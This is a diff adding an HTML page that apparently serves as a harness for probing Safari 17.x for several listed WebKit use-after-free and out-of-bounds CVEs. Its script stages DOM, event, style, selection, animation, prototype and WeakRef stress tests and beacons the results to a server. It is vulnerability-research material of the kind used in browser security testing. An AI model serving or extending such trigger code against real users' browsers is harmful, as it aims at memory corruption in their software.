@@ -1,0 +1,535 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1198 UAF+OOB CVE Battery (Safari 17.x pre-patch)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1198 — UAF + OOB CVE BATTERY</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1198-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* P1198: Battery of CVE triggers for Safari 17.x pre-patch bugs.
+   CVE-2023-42950: UAF in WebKit (heap UAF, fixed Safari 17.2)
+   CVE-2023-41976: UAF (fixed Safari 17.1)
+   CVE-2023-42916: OOB read (info disclosure, fixed Safari 17.1.2, exploited ITW)
+   CVE-2023-42890: Memory handling → RCE (fixed Safari 17.2)
+   CVE-2023-42852: Logic flaw → RCE (fixed Safari 17.1)
+
+   Without PoC details, we test the CLASSES of bugs these represent:
+   - DOM node UAF via async removal patterns
+   - Event listener UAF via detached subtrees
+   - CSS/style recalc UAF during tree modification
+   - OOB via large typed array / DataView edge cases
+   - Logic flaws via prototype chain corruption */
+
+(function run(){
+var STAGES=[
+  'detect',
+  'domNodeUAF',          /* Async DOM node removal + reference retention */
+  'eventListenerUAF',    /* Event listeners on detached subtrees */
+  'styleRecalcUAF',      /* Style recalc during tree modification */
+  'selectionUAF',        /* Selection API on rapidly mutating tree */
+  'cssAnimationUAF',     /* CSS animation callbacks during node removal */
+  'protoChainLogic',     /* Prototype chain corruption during operations */
+  'weakRefDangling'      /* WeakRef + FinalizationRegistry patterns */
+];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1198_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1198_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+(STAGES.length-1)+' — '+(STAGES[stage]||'done'));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  var summary=JSON.stringify(results).slice(0,800);
+  B('ALL-DONE',summary);
+  log('=== ALL STAGES COMPLETE ===','ok');
+  addFind(summary);
+  try{localStorage.removeItem('p1198_stage');localStorage.removeItem('p1198_res');}catch(e){}
+  return;
+}
+try{localStorage.setItem('p1198_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function done(rep){
+  results.push({s:stage,n:cur,r:rep});
+  try{localStorage.setItem('p1198_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','['+cur+']'+rep.slice(0,600));
+  addFind(cur+': '+rep.slice(0,300));
+  setStatus(rep.slice(0,80));
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT','stage='+(stage+1));
+  setTimeout(function(){location.reload(true);},600);
+}
+function gcP(n){for(var g=0;g<(n||3000);g++){var t=new ArrayBuffer(2048);t=null;}}
+
+/* ---- detect ---- */
+if(cur==='detect'){
+  setPhase('Feature detection');
+  var info=[];
+  info.push('Selection='+(typeof window.getSelection));
+  info.push('WeakRef='+(typeof WeakRef));
+  info.push('FinReg='+(typeof FinalizationRegistry));
+  info.push('CSSAnim='+(typeof CSSAnimation));
+  info.push('animate='+(typeof Element.prototype.animate));
+  info.push('adoptNode='+(typeof document.adoptNode));
+  info.push('createDoc='+(typeof document.implementation.createHTMLDocument));
+  done(info.join('|'));
+
+/* ---- domNodeUAF: retain references to removed nodes ---- */
+}else if(cur==='domNodeUAF'){
+  setPhase('DOM node UAF via async removal');
+  B('ATTEMPT','domNodeUAF');
+  var container=document.createElement('div');
+  document.body.appendChild(container);
+  var refs=[],anomalies=0;
+
+  /* Create deep tree with references */
+  for(var i=0;i<100;i++){
+    var el=document.createElement('div');
+    el.setAttribute('data-idx',''+i);
+    el.textContent='node'+i;
+    var inner=document.createElement('span');
+    inner.textContent='inner'+i;
+    el.appendChild(inner);
+    container.appendChild(el);
+    refs.push({outer:el,inner:inner,idx:i});
+  }
+
+  /* Remove nodes but keep references */
+  container.innerHTML='';
+  gcP(5000);
+
+  /* Now access the dangling references */
+  for(var j=0;j<refs.length;j++){
+    try{
+      var r2=refs[j];
+      /* These should work on detached nodes */
+      var pn=r2.outer.parentNode;
+      var cn=r2.outer.childNodes.length;
+      var txt=r2.inner.textContent;
+      /* Move to a new document */
+      var doc2=document.implementation.createHTMLDocument('');
+      var adopted=doc2.adoptNode(r2.outer);
+      /* Access after adoption */
+      var txt2=adopted.textContent;
+      if(txt2!==('node'+j+'inner'+j)){
+        anomalies++;
+        B('ANOMALY','adopt-text-mismatch|idx='+j+'|got='+txt2);
+      }
+      /* Move back */
+      document.adoptNode(adopted);
+    }catch(e){anomalies++;}
+  }
+  container.parentNode.removeChild(container);
+  done('refs='+refs.length+'|anomalies='+anomalies);
+
+/* ---- eventListenerUAF ---- */
+}else if(cur==='eventListenerUAF'){
+  setPhase('Event listener UAF on detached subtrees');
+  B('ATTEMPT','eventListenerUAF');
+  var div2=document.createElement('div');
+  document.body.appendChild(div2);
+  var fires=0,anomalies2=0;
+
+  /* Create subtree with event listeners */
+  var subtreeRoot=document.createElement('div');
+  for(var k=0;k<50;k++){
+    var btn=document.createElement('button');
+    btn.textContent='b'+k;
+    btn.addEventListener('click',function(ev){
+      fires++;
+      /* During event, try to access detached parent */
+      try{
+        var p=ev.target.parentNode;
+        if(p){
+          var newEl=document.createElement('span');
+          newEl.textContent='injected';
+          p.appendChild(newEl);
+          p.removeChild(newEl);
+        }
+      }catch(e){anomalies2++;}
+    });
+    subtreeRoot.appendChild(btn);
+  }
+  div2.appendChild(subtreeRoot);
+
+  /* Detach the subtree */
+  div2.removeChild(subtreeRoot);
+  gcP(3000);
+
+  /* Fire events on detached nodes */
+  var buttons=subtreeRoot.querySelectorAll('button');
+  for(var b=0;b<buttons.length;b++){
+    try{
+      var ev=new MouseEvent('click',{bubbles:true,cancelable:true});
+      buttons[b].dispatchEvent(ev);
+    }catch(e){anomalies2++;}
+  }
+
+  /* Re-attach and try again */
+  div2.appendChild(subtreeRoot);
+  for(var b2=0;b2<Math.min(10,buttons.length);b2++){
+    try{buttons[b2].click();}catch(e){anomalies2++;}
+  }
+
+  div2.parentNode.removeChild(div2);
+  done('fires='+fires+'|anomalies='+anomalies2+'|buttons='+buttons.length);
+
+/* ---- styleRecalcUAF ---- */
+}else if(cur==='styleRecalcUAF'){
+  setPhase('Style recalc during tree mutation');
+  B('ATTEMPT','styleRecalcUAF');
+  var div3=document.createElement('div');
+  div3.style.cssText='width:200px;height:200px;overflow:hidden;position:relative';
+  document.body.appendChild(div3);
+  var anomalies3=0,recalcs=0;
+
+  for(var m=0;m<100;m++){
+    /* Build styled subtree */
+    var styled=document.createElement('div');
+    styled.style.cssText='display:flex;flex-wrap:wrap;gap:2px';
+    for(var n=0;n<20;n++){
+      var item=document.createElement('div');
+      item.style.cssText='width:'+((n*13)%50+10)+'px;height:'+((n*7)%30+5)+'px;background:rgba(0,255,0,0.1)';
+      item.className='item-'+n;
+      styled.appendChild(item);
+    }
+    div3.appendChild(styled);
+
+    /* Force style recalc */
+    var cs=getComputedStyle(styled);
+    var display=cs.display;
+    recalcs++;
+
+    /* Mutate during potential async style resolution */
+    styled.style.display='grid';
+    styled.style.gridTemplateColumns='repeat(3,1fr)';
+    var cs2=getComputedStyle(styled);
+    var display2=cs2.display;
+
+    /* Remove while styles may still be resolving */
+    div3.removeChild(styled);
+
+    /* Access computed style of removed element */
+    try{
+      var cs3=getComputedStyle(styled);
+      var d3=cs3.display;
+      if(d3&&d3!=='grid'&&d3!==''){
+        anomalies3++;
+        B('ANOMALY','stale-style|iter='+m+'|display='+d3);
+      }
+    }catch(e){/* Expected on some browsers */}
+  }
+  div3.parentNode.removeChild(div3);
+  done('recalcs='+recalcs+'|anomalies='+anomalies3);
+
+/* ---- selectionUAF ---- */
+}else if(cur==='selectionUAF'){
+  setPhase('Selection API on mutating tree');
+  B('ATTEMPT','selectionUAF');
+  var div4=document.createElement('div');
+  div4.contentEditable='true';
+  div4.innerHTML='<p>Line one text here</p><p>Line two more text</p><p>Line three end</p>';
+  document.body.appendChild(div4);
+  var selOps=0,anomalies4=0;
+  var sel=window.getSelection();
+
+  for(var s=0;s<100;s++){
+    try{
+      /* Set selection spanning multiple nodes */
+      var paras=div4.querySelectorAll('p');
+      if(paras.length>=2&&paras[0].firstChild&&paras[1].firstChild){
+        var range=document.createRange();
+        range.setStart(paras[0].firstChild,2);
+        range.setEnd(paras[1].firstChild,3);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        selOps++;
+
+        /* Mutate nodes under selection */
+        div4.removeChild(paras[0]);
+        selOps++;
+
+        /* Read selection after mutation */
+        var selStr=sel.toString();
+        var rangeCount=sel.rangeCount;
+        selOps++;
+
+        /* Rebuild */
+        var newP=document.createElement('p');
+        newP.textContent='Rebuilt '+s;
+        div4.insertBefore(newP,div4.firstChild);
+
+        /* Collapse selection into mutated area */
+        try{
+          sel.collapse(div4.firstChild,0);
+          sel.extend(div4.lastChild,0);
+          selOps++;
+        }catch(e2){}
+      }
+    }catch(e){anomalies4++;}
+  }
+  sel.removeAllRanges();
+  div4.parentNode.removeChild(div4);
+  done('selOps='+selOps+'|anomalies='+anomalies4);
+
+/* ---- cssAnimationUAF ---- */
+}else if(cur==='cssAnimationUAF'){
+  setPhase('CSS animation during node removal');
+  B('ATTEMPT','cssAnimationUAF');
+  var div5=document.createElement('div');
+  document.body.appendChild(div5);
+  var animStarts=0,animEnds=0,anomalies5=0;
+  var pending=0,TOTAL=30;
+
+  /* Add keyframes */
+  var style=document.createElement('style');
+  style.textContent='@keyframes p1198fade{0%{opacity:1;transform:scale(1)}100%{opacity:0;transform:scale(0.5)}}';
+  document.head.appendChild(style);
+
+  function tryAnim(idx){
+    var el=document.createElement('div');
+    el.style.cssText='width:20px;height:20px;background:green;animation:p1198fade 0.05s linear';
+    el.textContent='a'+idx;
+
+    el.addEventListener('animationstart',function(){
+      animStarts++;
+      /* Remove the element during animation start */
+      try{
+        if(el.parentNode){
+          el.parentNode.removeChild(el);
+          gcP(500);
+          /* Access after removal */
+          var cs=getComputedStyle(el);
+          var op=cs.opacity;
+        }
+      }catch(e){anomalies5++;}
+    });
+    el.addEventListener('animationend',function(){
+      animEnds++;
+      try{if(el.parentNode)el.parentNode.removeChild(el);}catch(e){}
+      checkDone();
+    });
+
+    div5.appendChild(el);
+    /* Also try removing immediately */
+    setTimeout(function(){
+      try{if(el.parentNode)el.parentNode.removeChild(el);}catch(e){}
+      checkDone();
+    },10);
+  }
+
+  var completed=0;
+  function checkDone(){
+    completed++;
+    if(completed>=TOTAL*2){
+      style.parentNode.removeChild(style);
+      div5.parentNode.removeChild(div5);
+      done('animStarts='+animStarts+'|animEnds='+animEnds+'|anomalies='+anomalies5);
+    }
+  }
+
+  for(var a=0;a<TOTAL;a++){
+    tryAnim(a);
+  }
+  /* Timeout safety */
+  setTimeout(function(){
+    try{style.parentNode.removeChild(style);}catch(e){}
+    try{div5.parentNode.removeChild(div5);}catch(e){}
+    if(completed<TOTAL*2){
+      done('TIMEOUT|starts='+animStarts+'|ends='+animEnds+'|anomalies='+anomalies5);
+    }
+  },5000);
+  return;
+
+/* ---- protoChainLogic ---- */
+}else if(cur==='protoChainLogic'){
+  setPhase('Prototype chain corruption');
+  B('ATTEMPT','protoChainLogic');
+  var anomalies6=0,tests=0;
+  var rep6='';
+
+  /* Test 1: Override Array.prototype methods during iteration */
+  try{
+    var origMap=Array.prototype.map;
+    var origFilter=Array.prototype.filter;
+    var arr=[1,2,3,4,5];
+    var mapCalls=0;
+
+    Array.prototype.map=function(fn){
+      mapCalls++;
+      /* Mutate the array during map */
+      this.push(99);
+      this.length=2;
+      var result=origMap.call(this,fn);
+      return result;
+    };
+    var mapped=arr.map(function(x){return x*2;});
+    Array.prototype.map=origMap;
+    tests++;
+    rep6+='map:calls='+mapCalls+'|mapped='+mapped.length+'|arr='+arr.length;
+  }catch(e){
+    try{Array.prototype.map=origMap;}catch(e2){}
+    anomalies6++;
+    rep6+='map:THROW:'+e.message;
+  }
+
+  /* Test 2: Proxy as prototype */
+  try{
+    var handler={
+      get:function(target,prop){
+        tests++;
+        if(prop==='length') return 100;
+        return target[prop];
+      },
+      set:function(target,prop,val){
+        tests++;
+        target[prop]=val;
+        return true;
+      }
+    };
+    var base={};
+    var proxy=new Proxy(base,handler);
+    var obj2=Object.create(proxy);
+    obj2[0]='a';
+    obj2[50]='b';
+    var len=obj2.length;
+    rep6+='|proxy:len='+len+'|tests='+tests;
+  }catch(e){
+    anomalies6++;
+    rep6+='|proxy:THROW:'+e.message;
+  }
+
+  /* Test 3: Symbol.toPrimitive during comparison */
+  try{
+    var convCount=0;
+    var evil={};
+    evil[Symbol.toPrimitive]=function(hint){
+      convCount++;
+      gcP(1000);
+      if(hint==='number') return convCount;
+      return 'evil'+convCount;
+    };
+    var r1=(evil==1);
+    var r2=(evil>0);
+    var r3=(''+evil);
+    tests++;
+    rep6+='|toPrim:conv='+convCount+'|r1='+r1+'|r2='+r2+'|r3='+r3;
+  }catch(e){
+    anomalies6++;
+    rep6+='|toPrim:THROW:'+e.message;
+  }
+
+  done(rep6+'|anomalies='+anomalies6+'|tests='+tests);
+
+/* ---- weakRefDangling ---- */
+}else if(cur==='weakRefDangling'){
+  setPhase('WeakRef + FinalizationRegistry');
+  B('ATTEMPT','weakRefDangling');
+  var rep7='';
+  var anomalies7=0;
+
+  if(typeof WeakRef==='undefined'){
+    done('NO-WEAKREF');
+    return;
+  }
+
+  try{
+    var refs7=[],freed=0;
+    var fr=new FinalizationRegistry(function(held){
+      freed++;
+      B('FREED','idx='+held+'|total='+freed);
+    });
+
+    /* Create objects, weak-ref them, register for finalization */
+    for(var w=0;w<200;w++){
+      var obj7={idx:w,data:new ArrayBuffer(4096)};
+      var wr=new WeakRef(obj7);
+      fr.register(obj7,w);
+      refs7.push(wr);
+      obj7=null;
+    }
+
+    /* Force GC */
+    gcP(10000);
+
+    /* Check which are still alive */
+    var alive=0,dead=0;
+    for(var w2=0;w2<refs7.length;w2++){
+      var deref=refs7[w2].deref();
+      if(deref){
+        alive++;
+        /* Access the object — if corrupted this could crash or return wrong data */
+        try{
+          var idx=deref.idx;
+          var len=deref.data.byteLength;
+          if(len!==4096){
+            anomalies7++;
+            B('ANOMALY','weakref-len|idx='+idx+'|len='+len);
+          }
+        }catch(e){anomalies7++;}
+      }else{
+        dead++;
+      }
+    }
+    rep7='alive='+alive+'|dead='+dead+'|freed='+freed+'|anomalies='+anomalies7;
+  }catch(e){
+    rep7='THROW:'+e.constructor.name+':'+String(e.message).slice(0,60);
+  }
+  done(rep7);
+}
+
+})(); /* end IIFE */
+
+/* Reload poller */
+(function(){
+  var cur='P1198-uaf-oob-cves';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
